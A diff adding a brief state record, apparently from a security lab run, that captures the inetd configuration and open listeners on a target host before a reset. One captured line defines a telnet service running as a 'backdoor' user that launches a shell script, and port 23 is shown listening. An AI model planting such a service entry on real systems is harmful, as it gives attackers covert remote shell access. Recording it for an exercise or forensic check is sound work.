@@ -1,0 +1,11 @@
+run_id=R03
+record=reset-before
+timestamp_utc=2026-09-29T10:36:58+00:00
+target=10.0.0.139
+
+23:#<off># telnet	stream	tcp	nowait	root	/usr/sbin/tcpd	/usr/sbin/telnetd
+40:telnet stream tcp nowait backdoor /usr/sbin/telnetd telnetd -E /usr/local/bin/telnet-shell.sh
+--- LISTENERS ---
+LISTEN 0      128          0.0.0.0:22        0.0.0.0:*    users:(("sshd",pid=679,fd=3))            
+LISTEN 0      10           0.0.0.0:23        0.0.0.0:*    users:(("inetutils-inetd",pid=2376,fd=4))
+LISTEN 0      128             [::]:22           [::]:*    users:(("sshd",pid=679,fd=4))            
